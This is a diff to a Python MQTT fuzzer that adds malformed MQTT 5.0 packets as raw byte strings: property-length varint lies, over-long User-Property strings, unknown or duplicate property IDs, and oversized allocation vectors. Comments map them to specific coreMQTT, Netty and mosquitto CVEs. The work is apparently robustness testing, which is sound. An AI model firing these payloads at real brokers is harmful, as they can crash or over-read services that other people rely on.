@@ -67,28 +67,6 @@ import logging
 logger = logging.getLogger(__name__)
 
 
-class MQTTPacketTypes:
-    """MQTT Control Packet Types (4-bit values)"""
-
-    CONNECT = 0x10  # Client -> Server: Connection request
-    CONNACK = 0x20  # Server -> Client: Connection acknowledgment
-    PUBLISH = 0x30  # Both: Publish message (QoS 0)
-    PUBLISH_QOS1 = 0x32  # Both: Publish message (QoS 1, DUP=0)
-    PUBLISH_QOS2 = 0x34  # Both: Publish message (QoS 2, DUP=0)
-    PUBACK = 0x40  # Both: Publish acknowledgment (QoS 1)
-    PUBREC = 0x50  # Both: Publish received (QoS 2, step 1)
-    PUBREL = 0x62  # Both: Publish release (QoS 2, step 2)
-    PUBCOMP = 0x70  # Both: Publish complete (QoS 2, step 3)
-    SUBSCRIBE = 0x82  # Client -> Server: Subscribe request
-    SUBACK = 0x90  # Server -> Client: Subscribe acknowledgment
-    UNSUBSCRIBE = 0xA2  # Client -> Server: Unsubscribe request
-    UNSUBACK = 0xB0  # Server -> Client: Unsubscribe acknowledgment
-    PINGREQ = 0xC0  # Client -> Server: Ping request
-    PINGRESP = 0xD0  # Server -> Client: Ping response
-    DISCONNECT = 0xE0  # Both: Disconnect notification
-    AUTH = 0xF0  # MQTT 5.0: Authentication exchange
-
-
 class MQTTFuzzer(StatefulFuzzer):
     """MQTT Protocol Fuzzer for IoT/IIoT messaging protocol testing.
 
@@ -349,6 +327,23 @@ class MQTTFuzzer(StatefulFuzzer):
             RequestInfo(
                 "MQTT_Reason_Code_Sweep",
                 "MQTT 5.0 reason code sweep (all 256 byte values)",
+                "protocol",
+                requires_state=CommonState.ANY,
+            ),
+            # MQTT 5.0 property parser attacks (CVE-2026-8686 coreMQTT OOB read,
+            # CVE-2026-44248 Netty unbounded alloc, CVE-2023-3592 mosquitto will-prop)
+            RequestInfo(
+                "MQTT_V5_Property_Length_Lie",
+                "MQTT 5.0 property-length varint lies (0x00/max/over/under) "
+                "vs properties present (CVE-2026-8686 OOB read, CVE-2026-44248 alloc)",
+                "boundary",
+                requires_state=CommonState.ANY,
+            ),
+            RequestInfo(
+                "MQTT_V5_Property_Malformed",
+                "MQTT 5.0 malformed property blocks: unknown property-id, "
+                "User-Property (0x26) string-length over-read, truncated/duplicate, "
+                "oversized allocation vector (CVE-2026-44248, CVE-2023-3592)",
                 "protocol",
                 requires_state=CommonState.ANY,
             ),
@@ -1065,6 +1060,76 @@ class MQTTFuzzer(StatefulFuzzer):
             ),
         )
 
+        # ==================== MQTT 5.0 PROPERTY PARSER ATTACKS ====================
+        # MQTT 5.0 packets carry a property section = a property-length (variable
+        # byte integer) followed by a sequence of {property-identifier, value}.
+        # Parsers that trust the declared property-length, or that read a
+        # property's embedded string/binary length without bounds-checking it
+        # against the bytes actually present, over-read or over-allocate.
+        #   CVE-2026-8686  - coreMQTT property parser out-of-bounds read
+        #   CVE-2026-44248 - Netty unbounded MQTT 5.0 property allocation
+        #   CVE-2023-3592  - mosquitto will-property handling
+        #
+        # Carrier packets (topic "test", one Payload-Format-Indicator property
+        # 0x01 0x01 present, payload "hi") where the property-length VARINT is
+        # made to lie about how many property bytes follow.
+        mqtt_v5_property_length_lie = Request(
+            "MQTT_V5_Property_Length_Lie",
+            children=(
+                Group(
+                    "Property_Length_Lie",
+                    values=[
+                        # PUBLISH v5, property-length = max varint (268,435,455)
+                        # but only 4 property bytes present -> unbounded read/alloc.
+                        b"\x30\x0e\x00\x04test\xff\xff\xff\x7f\x01\x01hi",
+                        # PUBLISH v5, property-length = 0x00 but 2 property bytes
+                        # present -> parser desync (props consumed as payload).
+                        b"\x30\x0b\x00\x04test\x00\x01\x01hi",
+                        # PUBLISH v5, declared property-length (0x0a=10) > actual
+                        # (2 bytes present) -> read past the property section.
+                        b"\x30\x0b\x00\x04test\x0a\x01\x01hi",
+                        # PUBLISH v5, declared property-length (0x01=1) < actual
+                        # (2 bytes present) -> trailing property byte mis-parsed.
+                        b"\x30\x0b\x00\x04test\x01\x01\x01hi",
+                        # CONNECT v5, property-length = max varint but only a
+                        # 5-byte Session-Expiry (0x11) property present.
+                        b"\x10\x1b\x00\x04MQTT\x05\x02\x00\x3c"
+                        b"\xff\xff\xff\x7f\x11\x00\x00\x00\x3c\x00\x06fuzz01",
+                    ],
+                ),
+            ),
+        )
+
+        mqtt_v5_property_malformed = Request(
+            "MQTT_V5_Property_Malformed",
+            children=(
+                Group(
+                    "Property_Malformed",
+                    values=[
+                        # PUBLISH v5, User-Property (0x26) whose name string-length
+                        # (0xffff=65535) is far larger than the 2 bytes present
+                        # -> string over-read (CVE-2026-8686 class).
+                        b"\x30\x0c\x00\x04test\x05\x26\xff\xffAB",
+                        # PUBLISH v5, unknown property identifier 0x99 (not defined
+                        # for any MQTT 5.0 packet) with a trailing byte.
+                        b"\x30\x0a\x00\x04test\x02\x99\x00hi",
+                        # PUBLISH v5, truncated property: identifier 0x03
+                        # (Content-Type) declares a 0xffff string but no bytes.
+                        b"\x30\x09\x00\x04test\x03\x03\xff\xff",
+                        # PUBLISH v5, duplicate Payload-Format-Indicator (0x01)
+                        # -> some parsers reject/leak on duplicate scalar props.
+                        b"\x30\x0c\x00\x04test\x04\x01\x01\x01\x01hi",
+                        # CONNECT v5, oversized allocation vector: property-length
+                        # 0xff 0xff 0xff 0x7f then a User-Property (0x26) whose
+                        # value string-length is the 64-bit-ish max the encoder
+                        # allows (CVE-2026-44248 unbounded property allocation).
+                        b"\x10\x1c\x00\x04MQTT\x05\x02\x00\x3c"
+                        b"\xff\xff\xff\x7f\x26\x00\x01k\xff\xffV\x00\x06fuzz01",
+                    ],
+                ),
+            ),
+        )
+
         # ==================== OPTIMIZED REQUEST ORDERING ====================
         # Phase 1: Quick Coverage (~30 sec)
         if self.is_request_enabled("MQTT_Quick_Coverage"):
@@ -1127,6 +1192,13 @@ class MQTTFuzzer(StatefulFuzzer):
         # MQTT 5.0 reason code sweep — all 256 byte values
         if self.is_request_enabled("MQTT_Reason_Code_Sweep"):
             self.session.connect(mqtt_reason_code_sweep)
+
+        # MQTT 5.0 property parser attacks (property-length lies + malformed props)
+        if self.is_request_enabled("MQTT_V5_Property_Length_Lie"):
+            self.session.connect(mqtt_v5_property_length_lie)
+
+        if self.is_request_enabled("MQTT_V5_Property_Malformed"):
+            self.session.connect(mqtt_v5_property_malformed)
 
     def _define_state_machine(self) -> None:
         """
